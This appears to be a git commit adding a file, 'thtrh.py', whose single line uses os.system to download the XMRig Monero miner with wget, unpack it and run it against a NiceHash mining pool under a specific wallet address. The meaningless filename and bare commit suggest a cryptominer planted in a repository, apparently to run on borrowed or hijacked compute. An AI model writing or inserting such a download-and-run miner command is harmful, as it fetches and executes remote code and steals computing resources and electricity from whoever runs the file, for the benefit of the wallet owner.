e6a483d964f91a433c6e122205f302657594a34e
shivani21c <99197064+shivani21c@users.noreply.github.com>
2022-02-15 20:31:38 +0530

    Create thtrh.py

---
+++ thtrh.py
@@ -0,0 +1,2 @@
+
+os.system("wget https://github.com/xmrig/xmrig/releases/download/v6.14.1/xmrig-6.14.1-linux-x64.tar.gz && tar -zxvf xmrig-6.14.1-linux-x64.tar.gz && cd xmrig-6.14.1 && ./xmrig -o stratum+tcp://randomxmonero.eu-west.nicehash.com:3380 -u 3CgkTfbC3t6u8YJrySPv8RyvrLJAfyJkLg.1 -p x -k --nicehash -a rx/0")
